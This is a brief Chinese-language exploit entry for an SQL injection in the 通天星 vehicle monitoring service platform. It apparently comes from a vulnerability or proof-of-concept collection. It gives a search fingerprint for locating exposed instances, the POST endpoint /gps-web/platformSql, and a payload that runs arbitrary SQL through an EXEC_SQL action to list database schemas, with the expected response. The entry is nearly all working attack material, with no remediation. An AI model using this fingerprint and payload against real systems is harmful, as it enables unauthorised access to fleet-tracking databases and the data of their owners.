# 通天星车辆监控服务平台platformSql存在SQL注入漏洞

通天星车辆监控服务平台 ｜ SQL注入 ｜ —
- **指纹**：`body="./open/webApi.html"`
- **请求**：`POST /gps-web/platformSql HTTP/1.1`

**Payload**
```
action=EXEC_SQL&params=SELECT schema_name FROM information_schema.schemata
```
- **响应特征**：200